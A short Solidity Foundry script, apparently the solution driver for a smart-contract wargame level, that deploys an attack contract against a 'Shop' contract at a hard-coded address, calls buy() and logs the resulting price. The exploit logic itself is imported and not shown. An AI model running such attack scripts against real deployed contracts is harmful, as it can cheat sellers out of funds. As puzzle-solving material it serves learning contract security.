// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import {Shop, ShopAttack} from "../src/Shop.sol";

contract ShopScript is Script {
    function run() public {
        vm.startBroadcast();

        Shop shop = Shop(0x912781135CCf87affe45Efd00FD06B84B0442F4b);
        ShopAttack attack = new ShopAttack(address(shop));

        attack.buy();

        console.log(shop.price());

        vm.stopBroadcast();
    }
}